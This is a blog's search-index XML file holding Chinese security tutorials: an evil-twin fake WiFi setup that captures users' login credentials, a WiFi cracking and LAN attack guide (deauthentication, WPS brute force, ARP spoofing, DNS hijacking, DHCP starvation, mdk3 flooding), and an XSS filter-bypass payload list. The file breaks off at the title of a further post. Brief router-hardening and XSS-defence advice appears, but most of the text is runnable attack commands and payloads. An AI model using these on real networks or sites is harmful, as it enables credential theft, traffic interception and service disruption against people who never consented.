<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>简单快速搭建钓鱼wifi</title>
      <link href="/posts/8b06.html"/>
      <url>/posts/8b06.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="%5Cimages%5Cpasted-0.png" alt="upload successful"><br>钓鱼wifi是很久的话题了，但是传统的方法可能比较麻烦需要手动配置dhcp，dns，网卡，流量转发，比较麻烦，而且还有根据每次的网络环境需要重新的配置，这里介绍用WIFIpumpkin3工具简单快速的搭建钓鱼wifi</p><h2 id="WIFIpumpkin3的安装"><a href="#WIFIpumpkin3的安装" class="headerlink" title="WIFIpumpkin3的安装"></a>WIFIpumpkin3的安装</h2><p>WIFIpumpkin3依托的是python来构建dns，dhcp所以需要python环境且python环境要大于3.7，目前似乎不支持windows和mac，我用的kali上面已经集成了python3.8的环境，所以就不介绍python&gt;=3.7的安装了，需要的自行百度，下面的操作都是在kali2020.2上其他环境的安装参考官方文档<a href="https://wifipumpkin3.github.io/docs/getting-started" target="_blank" rel="noopener">WIFIpumpkin3</a></p><h3 id="python安装依赖"><a href="#python安装依赖" class="headerlink" title="python安装依赖"></a>python安装依赖</h3><pre><code>sudo apt install libssl-dev libffi-dev build-essential</code></pre><h3 id="安装git，kali中似乎已经集成"><a href="#安装git，kali中似乎已经集成" class="headerlink" title="安装git，kali中似乎已经集成"></a>安装git，kali中似乎已经集成</h3><pre><code>apt-get install git</code></pre><h3 id="下载WIFIpumpkin3"><a href="#下载WIFIpumpkin3" class="headerlink" title="下载WIFIpumpkin3"></a>下载WIFIpumpkin3</h3><p>选择合适的目录</p><pre><code>git clone https://github.com/P0cL4bs/wifipumpkin3.git</code></pre><p>下载完毕进入目录</p><pre><code>cd wifipumpkin3</code></pre><h3 id="安装PyQt5"><a href="#安装PyQt5" class="headerlink" title="安装PyQt5"></a>安装PyQt5</h3><pre><code>sudo apt install python3-pyqt5</code></pre><p>验证是否安装成功，如果打印了done则表示安装成功</p><pre><code>python3 -c &quot;from PyQt5.QtCore import QSettings; print(&#39;done&#39;)&quot;</code></pre><h3 id="编译安装WIFIpumpkin3"><a href="#编译安装WIFIpumpkin3" class="headerlink" title="编译安装WIFIpumpkin3"></a>编译安装WIFIpumpkin3</h3><pre><code>sudo python3 setup.py install</code></pre><p>如果显示下图这样就代表安装成功了<br><img src="https://Lmg66.github.io/img/175.png" alt="图片"></p><h2 id="WIFIpumpkin3创建钓鱼wifi"><a href="#WIFIpumpkin3创建钓鱼wifi" class="headerlink" title="WIFIpumpkin3创建钓鱼wifi"></a>WIFIpumpkin3创建钓鱼wifi</h2><p>启动wifipumpkin3</p><pre><code>wifipumpkin3</code></pre><p><img src="https://Lmg66.github.io/img/176.png" alt="图片"></p><p>设置网卡这里的网卡同样要具备ap模拟的网卡，wlan0为你的网卡</p><pre><code>set interface wlan0 </code></pre><p>设置wifi名称也就是ssid，demo修改为你要创建的wifi</p><pre><code>set ssid demo</code></pre><p>设置代理插件</p><pre><code>set proxy noproxy</code></pre><p>设置dns</p><pre><code>ignore pydns_server</code></pre><p>开启钓鱼wifi</p><pre><code>start</code></pre><p><img src="https://Lmg66.github.io/img/177.png" alt="图片"></p><h2 id="查看利用"><a href="#查看利用" class="headerlink" title="查看利用"></a>查看利用</h2><p>这里我们用手机连接一下，发现成功分配ip且有网络<br><img src="https://Lmg66.github.io/img/178.png" alt="图片"></p><p>看一下kali，这里显示了连接而且显示了连接的手机的型号<br><img src="https://Lmg66.github.io/img/179.png" alt="图片"></p><p>继续，我们用手机登录一个网站<br><img src="https://Lmg66.github.io/img/180.png" alt="图片"><br>看一下kali，发现抓取到了账号密码，而且还有流量记录的信息图片等等，okwifi钓鱼完成<br><img src="https://Lmg66.github.io/img/181.png" alt="图片"></p><h2 id="参考文章及说明"><a href="#参考文章及说明" class="headerlink" title="参考文章及说明"></a>参考文章及说明</h2><p>上文从渗透的角度说明陌生ifi，攻击者可以利用树莓派等小型设备放入大型的公共场所设置免费公共wifi是非常可怕的，所以提醒最好最好最好(重要的事情说三遍)不要连接陌生的wifi很容易盗取你的信息<br>WIFIpumpkin3还有很多用途可以自行探索，本文参考地址:<a href="https://wifipumpkin3.github.io/docs/getting-started" target="_blank" rel="noopener">https://wifipumpkin3.github.io/docs/getting-started</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建钓鱼wifi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wifi渗透</title>
      <link href="/posts/5e65.html"/>
      <url>/posts/5e65.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要讲述 <strong>家庭家庭家庭中</strong>（重要的事情说三遍，企业认证服务器的wifi一般非常非常的安全破解不来）如何破解wifi密码，破解wifi密码后的内网渗透利用(简单说明)，如何设置wifi路由器更安全，从渗透的方面看wifi安全，根据需求选择观看</p><h2 id="wifi渗透环境的打造"><a href="#wifi渗透环境的打造" class="headerlink" title="wifi渗透环境的打造"></a>wifi渗透环境的打造</h2><h3 id="硬件方面"><a href="#硬件方面" class="headerlink" title="硬件方面"></a>硬件方面</h3><p>需要支持监听模式的无线网卡，一般电脑自带的无线网卡是不支持监听模式的，需要购买<br>内置kail驱动 RT3070 RTL8187(推荐使用)<br>我购买的链接如下，用着还行，监听信号比手机强那么一点点<br><a href="https://m.tb.cn/h.VGGIItU?sm=0b7bf6" target="_blank" rel="noopener">https://m.tb.cn/h.VGGIItU?sm=0b7bf6</a></p><h3 id="软件方面"><a href="#软件方面" class="headerlink" title="软件方面"></a>软件方面</h3><p>因为wifi破解需要软件支持，Windows下载麻烦，推荐kali(因为kali自带很多工具)<br>因为用到kali，建议使用vmware虚拟机，不建议小白双系统kali或者Microsoft Store中的kali<br>vmware下载查看：<a href="https://www.52pojie.cn/thread-1026907-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1026907-1-1.html</a><br><strong>注意</strong>：无线网卡监听模式时如果出现vmware卡代码，监听时间长就停止的情况建议更换上面这个文章的vmware版本<br>kali的vm镜像下载，下载解压，vmware打开即可使用，下载地址: <a href="https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768" target="_blank" rel="noopener">https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768</a></p><h3 id="vmware和kali和无线网卡基础知识-选看"><a href="#vmware和kali和无线网卡基础知识-选看" class="headerlink" title="vmware和kali和无线网卡基础知识(选看)"></a>vmware和kali和无线网卡基础知识(选看)</h3><h4 id="USB无线网卡在kali-Linux的使用"><a href="#USB无线网卡在kali-Linux的使用" class="headerlink" title="USB无线网卡在kali Linux的使用"></a>USB无线网卡在kali Linux的使用</h4><ol><li>先不要开机 先打开服务<br><img src="https://Lmg66.github.io/img/148.png" alt="图片"></li><li>运行下图的<br><img src="https://Lmg66.github.io/img/149.png" alt="图片"></li><li>开机kali后 虚拟机选择网卡的连接<br><img src="https://Lmg66.github.io/img/150.png" alt="图片"></li><li>ifconfig 查看连接一般名字为wlan,但有肯能无线网卡处于down状态可用ifconfig -a查看,然后使ifconfig name up即可<h4 id="无线网卡一般有四种工作模式，即-Managed，Master，Ad-hoc，Monitor。"><a href="#无线网卡一般有四种工作模式，即-Managed，Master，Ad-hoc，Monitor。" class="headerlink" title="无线网卡一般有四种工作模式，即 Managed，Master，Ad-hoc，Monitor。"></a>无线网卡一般有四种工作模式，即 Managed，Master，Ad-hoc，Monitor。</h4>Managed 模式：该模式用于你的无线客户端直接与无线接入点（Access Point，即AP）进行接入连接。在这个模式中，我们可以进行无线接入internet上网，无线网卡的驱动程序依赖无线AP管理整个通信过程。<br>Master 模式：一些无线网卡支持Master模式。这个模式允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的无线AP。它主要使用于无线接入点AP提供无线接入服务以及路由功能。比如无线路由器就是工作在Master模式下了，对于普通的pc机来说，如果有合适的硬件它也可以变成一台无线AP。<br>Ad hoc模式：当你的网络由互相直连的设备组成时，就使用这个模式。在这个模式中，各设备之间采用对等网络的方式进行连接，无线通信双方共同承担无线AP的职责。<br>Monitor 模式：Monitor模式主要用于监控无线网络内部的流量，用于检查网络和排错。要使Wireshark捕获无线数据包，你的无线网卡和配套驱动程序必须支持监听模式（也叫RFMON模式）。<h4 id="kali桥接网卡上网"><a href="#kali桥接网卡上网" class="headerlink" title="kali桥接网卡上网"></a>kali桥接网卡上网</h4><img src="https://Lmg66.github.io/img/151.png" alt="图片"><br>参见:<a href="https://www.linuxidc.com/Linux/2016-09/135521p3.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2016-09/135521p3.htm</a><h2 id="wifi密码的破解"><a href="#wifi密码的破解" class="headerlink" title="wifi密码的破解"></a>wifi密码的破解</h2>因为wep加密已经没有使用的，非常不安全，就忽略了<h3 id="最简单最好用的wifi密码破解方法"><a href="#最简单最好用的wifi密码破解方法" class="headerlink" title="最简单最好用的wifi密码破解方法"></a>最简单最好用的wifi密码破解方法</h3>使用wifi万能钥匙，腾讯wifi管家等等，其原理就是wifi密码共享，使用过该软件会将你的连接过的wifi密码共享出去，其本身不是破解而是共享制，连接后我们就可以看见密码了，所以这种破解方法非常的好用，首先推荐<h3 id="基础说明airodump-ng"><a href="#基础说明airodump-ng" class="headerlink" title="基础说明airodump-ng"></a>基础说明airodump-ng</h3><pre><code>airmon-ng start wlan0     开启监听模式airodump-ng wlan0mon      开始扫描附近wifi</code></pre>airodump-ng wlan0mon参数：</li></ol><p>-w    输出文件<br>–ivs    只保存ivs，不再保存所有无线数据，只是保存可以用于破解的IVS数据报文<br>-c    指定信道<br>–bssid    指定路由的bssid也就是MAC地址<br>–essid    指定路由的essid，可以理解为wifi名称（不准确）<br>airodump-ng wlan0mon 扫描参数<br><img src="https://Lmg66.github.io/img/152.png" alt="图片"><br>    BSSID    AP的MAC地址<br>    PWR    信号强度接近0信号好<br>    Beacons    无线ap的发送通告，告诉我是谁 周期发送<br>    #Data    抓到的数据包<br>    CH    信道<br>    MB    最大传输速度<br>    ENC    加密方法<br>    CIPHER    加密算法<br>    AUTH    认证协议<br>    ESSID    通指wifi名字 无名表示未广播<br>    STATION    客户端<br>    RATE    传输速率<br>    Lost    最近10秒的丢包数<br>    Frames    来自客户端的数据<br>    Probes    主动弹出 如果客户端正试图连接一个AP但没有连上，会显示这里<br>Aircrack-ng工具包</p><ul><li>aircrack-ng 破解</li><li>airmon-ng 改变网卡工作模式</li><li>airodump-ng 捕获报文</li><li>aireplay-ng 提供各种攻击</li><li>airserv-ng 网卡连接到指定端口 用作无限跳板</li><li>airolib-ng 彩虹表破解创建数据库文件</li><li>airdecap-ng 解包<h3 id="WPA破解"><a href="#WPA破解" class="headerlink" title="WPA破解"></a>WPA破解</h3>指定监听的wifi<br>airodump-ng -w [文件] –bssid [wifibssid] -c [信道最好指定] wlan0mon<br><img src="https://Lmg66.github.io/img/153.png" alt="图片"><br>管理针攻击将其他用户踢下线<br>aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION] wlan0mon<br><img src="https://Lmg66.github.io/img/154.png" alt="图片"><br>管理针攻击获得握手包<br><img src="https://Lmg66.github.io/img/155.png" alt="图片"><br>如果出现错误可尝试<br>–ignore-negative-one           忽略-1信道<br>根据握手包暴力破解密码<br>aircrack-ng -w [密码字典] [握手包.cap]<br><img src="https://Lmg66.github.io/img/156.png" alt="图片"><br><img src="https://Lmg66.github.io/img/157.png" alt="图片"><br><img src="https://Lmg66.github.io/img/158.png" alt="图片"><br>根据握手包破解密码加速<br>这里推荐使用windows下GPU加速工具EWSA，还有其他加速方式不过我不怎么推荐，也可以找专业的跑包团队来跑包<br>EWSA下载和使用说明地址:<a href="https://www.52pojie.cn/thread-989800-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-989800-1-1.html</a><br>找跑包地址：<a href="https://www.anywlan.com/forum-134-1.html" target="_blank" rel="noopener">https://www.anywlan.com/forum-134-1.html</a><h3 id="ping攻击-前提路由器开启wps"><a href="#ping攻击-前提路由器开启wps" class="headerlink" title="ping攻击 前提路由器开启wps"></a>ping攻击 前提路由器开启wps</h3>8位ping码，第8位数是校验码，只需要破解七位，ping码分前部分(4位)后部分(3位)，pin认证连接失败，路由器返回EAP-NACK信息，通过回应，能够确定pin的前部分或后部分是否正确，所以可能性是11000(10^4+10^3),不过考虑信号和路由器的处理性能网卡功率等可能时间会长，如果信号好，网卡，路由器也比较好一般需要6个小时左右<br>查看开启wps的wifi<pre><code>wash -i wlan0mon</code></pre><img src="https://Lmg66.github.io/img/159.png" alt="图片"><br>reaver -I wlan0mon -b [BSSID] -vv 还可以加其他参数 进行爆破<br><img src="https://Lmg66.github.io/img/160.png" alt="图片"><h3 id="kali自动化工具wifite"><a href="#kali自动化工具wifite" class="headerlink" title="kali自动化工具wifite"></a>kali自动化工具wifite</h3>原理：就是上面的命令只不过是自动化了<br>使用：cmd输入wifite进入扫描<br><img src="https://Lmg66.github.io/img/161.png" alt="图片"><br>觉得扫描好了ctrl+c就好，按照序号选择要破解的wifi即可，根据wifi开启了啥会进行自动的破解，如果想跳过某个破解方式按ctrl+c即可，如果获取到握手包自带的密码字典没跑出来，可以去上面提醒的路径找握手包，用自己的字典跑<br><img src="https://Lmg66.github.io/img/162.png" alt="图片"><br><img src="https://Lmg66.github.io/img/163.png" alt="图片"><h3 id="突破限制"><a href="#突破限制" class="headerlink" title="突破限制"></a>突破限制</h3><h4 id="mac地址限制"><a href="#mac地址限制" class="headerlink" title="mac地址限制"></a>mac地址限制</h4>扫描查看已连接的客户机的mac地址将网卡的mac地址改为其即可<br>先down掉网卡<br>ifconfig wlan0 down<br>修改mac地址<br>macchanger wlan0 -m [需要修改的mac地址，有些网卡可能不支持修改]<br>启动网卡<br>ifconfig wlan0 up<h4 id="未广播ssid的wifi"><a href="#未广播ssid的wifi" class="headerlink" title="未广播ssid的wifi"></a>未广播ssid的wifi</h4></li></ul><p>1.等待其他用户连接，会先询问ssid<br>airodump-ng wlan0mon 就能看见<br>2.将别人踢下线，让其重连，和抓起握手包一样，注意信道<br>aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION]</p><h2 id="连接wifi后的利用-内网渗透"><a href="#连接wifi后的利用-内网渗透" class="headerlink" title="连接wifi后的利用(内网渗透)"></a>连接wifi后的利用(内网渗透)</h2><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>查看内网的主机<br>nmap -sP 192.168.1.0/24 -v<br><img src="https://Lmg66.github.io/img/164.png" alt="图片"><br>开启转发模式</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><p>双向欺骗分别是目标主机ip和网关<br>arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106<br>arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1<br><img src="https://Lmg66.github.io/img/165.png" alt="图片"><br><img src="https://Lmg66.github.io/img/166.png" alt="图片"><br>启动wireshare查看ip.src == 192.168.1.106，发现欺骗成功可以拦截他的访问<br><img src="https://Lmg66.github.io/img/167.png" alt="图片"><br>driftnet -i eth0 监听图片<br><img src="https://Lmg66.github.io/img/168.png" alt="图片"></p><h3 id="毒化内网用户无法上网"><a href="#毒化内网用户无法上网" class="headerlink" title="毒化内网用户无法上网"></a>毒化内网用户无法上网</h3><p>原理:进行arp欺骗但不进行转发<br>echo 0 &gt; /proc/sys/net/ipv4/ip_forward<br>双向欺骗<br>arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106<br>arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1</p><h3 id="dns劫持"><a href="#dns劫持" class="headerlink" title="dns劫持"></a>dns劫持</h3><p>目标主机window7   ip地址 192.168.124.128<br>攻击机kali              ip地址 192.168.124.139<br>劫持到web服务window10(phpstudy) ip地址 192.168.1.104<br>修改配置文件nano /etc/ettercap/etter.dns<br><img src="https://Lmg66.github.io/img/169.png" alt="图片"><br>ettercap -Tq -i eth0 -P dns_spoof /// ///<br>进行欺骗-i后是无线网卡 ///中加目标主机和网卡，不加就是全部，发现window7被劫持成功，如果安装杀毒软件可能劫持不了<br><img src="https://Lmg66.github.io/img/170.png" alt="图片"><br><img src="https://Lmg66.github.io/img/171.png" alt="图片"><br>如何恢复</p><pre><code>ipconfig/flushdns刷新即可</code></pre><p><img src="https://Lmg66.github.io/img/172.png" alt="图片"></p><h3 id="mac地址表泛红"><a href="#mac地址表泛红" class="headerlink" title="mac地址表泛红"></a>mac地址表泛红</h3><p>交换机中有mac地址表记录连接的pc，攻击者不断刷新mac地址来填满交换机的mac地址表，交换机在mac地址表找不到该用户只能通过广播的形式发送，攻击者就可以截获数据<br>交换机设置静态mac地址绑定可预防，非表内请求将全部丢弃</p><pre><code>macof -i eth0</code></pre><h3 id="dhcp地址耗尽攻击"><a href="#dhcp地址耗尽攻击" class="headerlink" title="dhcp地址耗尽攻击"></a>dhcp地址耗尽攻击</h3><p>路由器分配ip，攻击者发送大量discover包来获取ip让其者无ip使用，无法连接<br>先安装<br>apt-get install yersinia<br>启动<br>yersinia -G<br><img src="https://Lmg66.github.io/img/173.png" alt="图片"><br><img src="https://Lmg66.github.io/img/174.png" alt="图片"></p><h2 id="干扰通讯"><a href="#干扰通讯" class="headerlink" title="干扰通讯"></a>干扰通讯</h2><p>以下利用前提无线网卡要开启监听模式</p><h3 id="创建恶意的无线热点"><a href="#创建恶意的无线热点" class="headerlink" title="创建恶意的无线热点"></a>创建恶意的无线热点</h3><p>工具mdk3 mdk3可查看使用说明</p><pre><code>mdk3 wlan0mon b -n SSID (-f 可以导入列表创建多个ssidwifi，不指定则随机) -c [信道] -w -g -s 100</code></pre><h3 id="验证洪水攻击-攻击路由器"><a href="#验证洪水攻击-攻击路由器" class="headerlink" title="验证洪水攻击(攻击路由器)"></a>验证洪水攻击(攻击路由器)</h3><p>伪造大量的client去连接ap,可导致正在已连接用户无反应 -a后加交换机ssid</p><pre><code>mdk3 wlan0mon a -a FC:D7:33:DE:F3:8A -c  -s 300</code></pre><h3 id="强制解除验证洪水攻击方式-针对客户机使其下线，通过模仿管理针"><a href="#强制解除验证洪水攻击方式-针对客户机使其下线，通过模仿管理针" class="headerlink" title="强制解除验证洪水攻击方式(针对客户机使其下线，通过模仿管理针)"></a>强制解除验证洪水攻击方式(针对客户机使其下线，通过模仿管理针)</h3><p>就是之前抓握手包一样将别人踢下线</p><pre><code>aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION] wlan0mon</code></pre><p>用mdk3针对全网，在攻击中踢掉线后也无法连接成功</p><pre><code>mdk3 wlan0mon d</code></pre><p>可-b 加文件指定mac地址攻击</p><h2 id="如何设置路由器更安全"><a href="#如何设置路由器更安全" class="headerlink" title="如何设置路由器更安全"></a>如何设置路由器更安全</h2><p>攻与防御本身就是一场博弈根据上面的攻击方式我们可以设置路由器是wifi更安全尤其是物联网的发展，家里的很多东西都要连接网络</p><ol><li>wifi加密方式采用wpa加密，不用采用wpe加密，如果不懂wps，也不要开启wps功能</li><li>wifi密码要不要使用弱口令</li><li>对于常用设备可以进行ip和mac的绑定</li><li>如果没有用户之间相互访问的需求可以开启ap隔离</li><li>可以设置访客wifi，防止密码被泄露</li><li>就是选用一些比较好的路由器，防止路由器本身存在漏洞，路由器页面就是web页面可能存在漏洞</li><li>尽量少使用wifi万能钥匙，腾讯wifi管家等，或者使用时找到里面的设置不共享自己的wifi密码<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>b站：<a href="https://www.bilibili.com/video/BV1e7411o7GB?p=1" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1e7411o7GB?p=1</a><br>b站：<a href="https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&seid=10037556429710890008" target="_blank" rel="noopener">https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&amp;seid=10037556429710890008</a><br>论坛：<a href="https://www.anywlan.com/" target="_blank" rel="noopener">https://www.anywlan.com/</a><br>等等等很多前辈的文章，没法都列举(找不到了)，表示抱歉和感谢</li></ol>]]></content>
      
      
      <categories>
          
          <category> 无线安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wifi渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss原理绕过防御个人总结</title>
      <link href="/posts/a100.html"/>
      <url>/posts/a100.html</url>
      
        <content type="html"><![CDATA[<h2 id="xss原理"><a href="#xss原理" class="headerlink" title="xss原理"></a>xss原理</h2><p>xss产生的原因是将恶意的html脚本代码插入web页面，底层原理和sql注入一样，都是因为js和php等都是解释性语言，会将输入的当做命令执行,所以可以注入恶意代码执行我们想要的内容</p><h2 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h2><ul><li>存储型xss:<br>js脚本代码会插入数据库，具有一定的持久性</li><li>反射型xss:<br>js经过后端php等语言处理</li><li>dom型xss:<br>和反射型xss类似，但是不经过后端服务器的处理<h2 id="xss绕过总结"><a href="#xss绕过总结" class="headerlink" title="xss绕过总结:"></a>xss绕过总结:</h2><h3 id="自身绕过"><a href="#自身绕过" class="headerlink" title="自身绕过"></a>自身绕过</h3><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;  //没有过滤&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt; //大小写绕过&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scscriptript&gt; //嵌套绕过&lt;sc\x00ript&gt;alert(&#39;xss&#39;)&lt;/sc\x00ript&gt; //空字节绕过&quot; oonnclick=alert(&#39;XSS&#39;) //           //闭合单双引号绕过(对于html实体输入的和过滤&lt; &gt;)</code></pre></li></ul><h3 id="其他标签绕过"><a href="#其他标签绕过" class="headerlink" title="其他标签绕过"></a>其他标签绕过</h3><pre><code>&lt;a herf=&quot;javascript:alert(1)&quot;&gt;show&lt;/a&gt; &lt;body onload=alert(1)&gt;&lt;input type=image src=x:x onerror=alert(1)&gt;&lt;isindex onmouseover=&quot;alert(1)&quot; &gt;&lt;form oninput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;input oncut=alert(1)&gt;&lt;svg onload=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;&lt;marquee onstart=alert(1)&gt;</code></pre><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><pre><code>&lt;a herf=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;show&lt;/a&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;               </code></pre><h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><p>在线编码地址:<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;&lt;script&gt;\u0061lert(1)&lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</code></pre><p><img src="https://Lmg66.github.io/img/146.png" alt="图片"></p><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;</code></pre><h4 id="Ascii码绕过"><a href="#Ascii码绕过" class="headerlink" title="Ascii码绕过"></a>Ascii码绕过</h4><pre><code>&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</code></pre><p>可使用浏览器插件快速编码<br><img src="https://Lmg66.github.io/img/147.png" alt="图片"></p><h4 id="hex绕过"><a href="#hex绕过" class="headerlink" title="hex绕过"></a>hex绕过</h4><pre><code>&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;</code></pre><h4 id="十进制，八进制，十六进制"><a href="#十进制，八进制，十六进制" class="headerlink" title="十进制，八进制，十六进制"></a>十进制，八进制，十六进制</h4><pre><code>&lt;img src=x onerror=&quot;\u0061lert(1)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\141lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\x61lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=”&amp;#x0061;lert(1)”/&gt;&lt;img src=x onerror=”&amp;#97;lert(1)”/&gt;&lt;img src=x onerror=”eval(‘\a\l\ert(1)‘)”/&gt;</code></pre><h3 id="补充-on事件"><a href="#补充-on事件" class="headerlink" title="补充:on事件"></a>补充:on事件</h3><pre><code>onsearchonwebkitanimationendonwebkitanimationiterationonwebkitanimationstartonwebkittransitionendonabortonbluroncanceloncanplayoncanplaythroughonchangeonclickoncloseoncontextmenuoncuechangeondblclickondragondragendondragenterondragleaveondragoverondragstartondropondurationchangeonemptiedonendedonerroronfocusonformdataoninputoninvalidonkeydownonkeypressonkeyuponloadonloadeddataonloadedmetadataonloadstartonmousedownonmouseenteronmouseleaveonmousemoveonmouseoutonmouseoveronmouseuponmousewheelonpauseonplayonplayingonprogressonratechangeonresetonresizeonscrollonseekedonseekingonselectonstalledonsubmitonsuspendontimeupdateontoggleonvolumechangeonwaitingonwheelonauxclickongotpointercaptureonlostpointercaptureonpointerdownonpointermoveonpointeruponpointercancelonpointeroveronpointeroutonpointerenteronpointerleaveonselectstartonselectionchangeonanimationendonanimationiterationonanimationstartontransitionendonafterprintonbeforeprintonbeforeunloadonhashchangeonlanguagechangeonmessageonmessageerroronofflineononlineonpagehideonpageshowonpopstateonrejectionhandledonstorageonunhandledrejectiononunload</code></pre><h3 id="长度限制的绕过"><a href="#长度限制的绕过" class="headerlink" title="长度限制的绕过:"></a>长度限制的绕过:</h3><h4 id="可以利用事件如"><a href="#可以利用事件如" class="headerlink" title="可以利用事件如:"></a>可以利用事件如:</h4><pre><code>&quot;onclick=alert(1)// 来减少字数</code></pre><h4 id="将代码藏入location-hash中，构造为"><a href="#将代码藏入location-hash中，构造为" class="headerlink" title="将代码藏入location.hash中，构造为"></a>将代码藏入location.hash中，构造为</h4><pre><code>&quot;onclick=&quot;eval(location.hash.sustr(1))</code></pre><h4 id="注释将两个文本框变为一个"><a href="#注释将两个文本框变为一个" class="headerlink" title="注释将两个文本框变为一个"></a>注释将两个文本框变为一个</h4><h4 id="奇怪的符号解析"><a href="#奇怪的符号解析" class="headerlink" title="奇怪的符号解析"></a>奇怪的符号解析</h4><pre><code>&lt;svg/onload=alert()&gt;&lt;script/src=//⑭.₨&gt;</code></pre><p>参考文章:<a href="https://nosec.org/home/detail/3206.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3206.html</a></p><h2 id="xss防御"><a href="#xss防御" class="headerlink" title="xss防御"></a>xss防御</h2><ol><li>设置cookie中设置httponly属性，那么js脚本将无法读取到cookie信息<br>PHP5(PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中设置，设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性)<br>session.cookie_httponly =<br>当然代码也能实现：<br>ini_set(“session.cookie_httponly”, 1);<br>session_set_cookie_params(0, NULL, NULL, NULL, TRUE);</li><li>限制输入长度，在业务内减少用户能输入长度，像年龄，用户名等地方限制15个字符，几乎就很难xss（个人理解）</li><li>过滤业务用不到的字符如&lt; &gt;，script等标签字符</li><li>输出检查，输出到url的进行URLEncode，输出进行html实体化输出</li><li>成熟框架相对安全些（注意是相对）<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>深入理解浏览器解析机制和XSS向量编码：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a><br>XSS过滤绕过速查表：<a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/153055.html</a><br>《白帽子讲web安全》</li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss利用</title>
      <link href="/posts/b0f.html"/>
      <url>/posts/b0f.html</url>
      
